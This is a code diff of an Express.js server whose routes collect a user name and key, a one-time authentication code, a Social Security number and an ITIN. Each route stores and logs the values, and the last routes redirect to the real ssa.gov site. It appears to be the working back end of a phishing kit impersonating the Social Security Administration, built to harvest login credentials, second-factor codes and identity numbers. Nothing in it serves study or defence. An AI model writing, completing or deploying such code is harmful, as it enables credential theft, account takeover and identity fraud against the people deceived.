@@ -47,16 +47,14 @@ app.get('/auth', (req, res) => {
 })
 
 app.post('/auth', (req, res) => {  
-  // Process input data from auth page and store it in the database
   const authData = new AuthData({
-    // Map input values to the data structure
-    email: req.body.email,
-    password: req.body.password
+    user: req.body.user,
+    key: req.body.key
   });
-  console.log(req.body)
   authData.save()
     .then(() => {
-      res.redirect('/auth_code');
+      console.log(req.body)
+      res.redirect('/auth_code')
     })
     .catch(err => {
       console.error(err);
@@ -75,9 +73,9 @@ app.post('/auth_code', (req, res) => {
     // Map input values to the data structure
     code: req.body.code
   });
-  console.log(req.body)
   authData.save()
     .then(() => {
+      console.log(req.body)
       res.redirect('/auth_ssn');
     })
     .catch(err => {
@@ -98,9 +96,9 @@ app.post('/auth_ssn', (req, res) => {
     // Map input values to the data structure
     ssn: req.body.ssn
   });
-  console.log(req.body)
   authData.save()
     .then(() => {
+      console.log(req.body)
       res.redirect('https://www.ssa.gov/');
     })
     .catch(err => {
@@ -116,14 +114,12 @@ app.get('/auth_itin', (req, res) => {
 })
 
 app.post('/auth_itin', (req, res) => {
-  // Process input data from auth page and store it in the database
   const authData = new AuthData({
-    // Map input values to the data structure
     itin: req.body.itin
   });
-  console.log(req.body)
   authData.save()
     .then(() => {
+      console.log(req.body)
       res.redirect('https://www.ssa.gov/');
     })
     .catch(err => {
@@ -132,9 +128,6 @@ app.post('/auth_itin', (req, res) => {
     });
 });
 
-
-// Similar routes for auth_code, auth_ssn, and auth_itin pages
-// ...
 
 app.listen(port, () => {
   console.log(`Server listening on port ${port}`);
